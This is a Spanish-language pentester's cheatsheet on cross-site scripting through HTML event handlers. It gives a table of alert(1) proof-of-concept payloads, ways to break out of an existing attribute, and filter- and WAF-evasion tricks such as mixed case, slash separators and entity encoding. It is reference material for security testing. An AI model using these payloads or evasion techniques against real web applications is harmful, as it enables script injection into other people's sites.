---
aliases:
tags:
  - type/cheatsheet
  - vuln/xss
  - technique/execution
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
type: CheatSheet
linked:
  - "[[Cross-Site Scripting (XSS)]]"
---
# XSS - Manejadores de Eventos HTML

___

## Cheatsheet
```
<pre><code></code></pre>
```

|               **Vector / Manejador**               |                                               **Payload de Ejemplo**                                                |                                                                                 **Contexto de Inyección y Explotación**                                                                                  |
| :------------------------------------------------: | :-----------------------------------------------------------------------------------------------------------------: | :------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------: |
|       <br><pre><code>`onerror`</code></pre>        |                           <br><pre><code>`<img src="x" onerror="alert(1)">`</code></pre>                            |       <br>**Automático.** El evento se dispara instantáneamente cuando el navegador no puede cargar el recurso (origen inválido `x`). Es uno de los vectores más confiables y utilizados.<br><br>        |
|        <br><pre><code>`onload`</code></pre>        |                                <br><pre><code>`<svg onload="alert(1)">`</code></pre>                                |               <br>**Automático.** Ejecuta el código tan pronto como el elemento se renderiza en el [[DOM]]. Excelente alternativa cuando las etiquetas de imagen están filtradas.<br><br>                |
|       <br><pre><code>`onfocus`</code></pre>        |                         <br><pre><code>`<input autofocus onfocus="alert(1)">`</code></pre>                          | <br>**Automático / Interactivo.** Al combinarlo con el atributo `autofocus`, obligo al navegador a centrarse en el elemento de inmediato, disparando el evento sin requerir un clic del usuario.<br><br> |
|     <br><pre><code>`onmouseover`</code></pre>      |                         <br><pre><code>`<h1 onmouseover="alert(1)">Texto</h1>`</code></pre>                         |                 <br>**Interactivo.** Requiere que la víctima pase el cursor por encima del elemento. Útil para evadir bloqueos estrictos sobre eventos de ejecución automática.<br><br>                  |
|       <br><pre><code>`onclick`</code></pre>        |                       <br><pre><code>`<a href="#" onclick="alert(1)">Click</a>`</code></pre>                        |             <br>**Interactivo.** Depende de la acción explícita del usuario. Frecuente al escapar del valor de un atributo para inyectar un nuevo manejador (`" onclick="alert(1)`).<br><br>             |
| <br><br><pre><code>`onanimationstart`</code></pre> | <br><pre><code>`<style>@keyframes x{}</style><x style="animation-name:x" onanimationstart="alert(1)">`</code></pre> |            <br>**Automático (Avanzado).** Vector de evasión de WAF. Vincula una animación CSS vacía a un elemento cualquiera, disparando el evento en cuanto el motor de estilos la procesa.             |
|       <br><pre><code>`ontoggle`</code></pre>       |                          <br><pre><code>`<details open ontoggle="alert(1)">`</code></pre>                           |              <br>**Automático.** El atributo `open` fuerza el cambio de estado del elemento `<details>` al renderizarse, lo que inmediatamente desencadena el manejador `ontoggle`.<br><br>              |
|     <br><pre><code>`onhashchange`</code></pre>     |                   <br><pre><code>`<body onhashchange="alert(1)"><a href="#x">Ir</a>`</code></pre>                   |                 <br>**Interactivo.** Se ejecuta cuando cambia el fragmento de la URL. Muy efectivo en aplicaciones de página única (SPA) donde la navegación se basa en anclas.<br><br>                  |
^xss-eventos

### Inyección en Contextos Preexistentes

La efectividad de los manejadores de eventos se maximiza cuando no es posible inyectar etiquetas HTML nuevas, pero sí alterar los atributos de una etiqueta existente. Para lograr esto, es imperativo escapar del atributo donde aterriza la inyección.

- **Inyección en Atributo de Valor:** Si la entrada se refleja en `<input type="text" value="INYECCIÓN_AQUÍ">`, el objetivo es cerrar el atributo `value` y añadir el manejador de eventos sin cerrar la etiqueta.
    - Payload: `" autofocus onfocus="alert(1)`
    - Resultado en el DOM: `<input type="text" value="" autofocus onfocus="alert(1)">`
        
- **Inyección Dinámica de Tipos:** A veces es necesario sobrescribir propiedades del elemento anfitrión para habilitar el evento.
    - Payload: `" type="image" src="x" onerror="alert(1)`
    - Resultado en el DOM: `<input type="text" value="" type="image" src="x" onerror="alert(1)">`


___

### Evasión de Filtros Estructurales

Dado que los manejadores de eventos operan como atributos HTML, se benefician de las reglas de decodificación permisivas de los motores de los navegadores, ofreciendo vías adicionales para eludir restricciones de entrada:
- **Insensibilidad a Mayúsculas:** Los nombres de atributos no distinguen entre mayúsculas y minúsculas en HTML. `oNeRrOr=alert(1)` es procesado de forma idéntica a `onerror=alert(1)`.
- **Uso de Separadores Alternativos:** Los navegadores aceptan múltiples delimitadores entre atributos, no solo espacios. Se pueden utilizar barras diagonales (`/`) u otros espacios en blanco. Ej: `<svg/onload=alert(1)>`
- **Codificación de Entidades en el Payload:** A diferencia de la etiqueta de script directa, el contenido dentro de un manejador de eventos HTML se decodifica _antes_ de enviarse al intérprete de JavaScript. Esto me permite ofuscar el código mediante entidades HTML. Ej: `<svg onload="&#x61;&#x6c;&#x65;&#x72;&#x74;(1)">`


___

## Overview

Cuando las defensas de una aplicación web, como un [[Web Application Firewall]] (WAF) o un filtro de [[Sanitización]], bloquean explícitamente la etiqueta de script estándar, recurro a vectores alternativos. La inyección a través de manejadores de eventos (event handlers) HTML permite ejecutar código JavaScript aprovechando el ciclo de vida de las etiquetas estándar del [[DOM]] o la interacción del usuario.

El principio radica en inyectar atributos específicos (que comienzan con `on...`) dentro de etiquetas HTML permitidas, forzando al navegador a ejecutar el payload cuando se cumpla la condición del evento en lugar de depender de la ejecución directa de un bloque `<script>`.

___
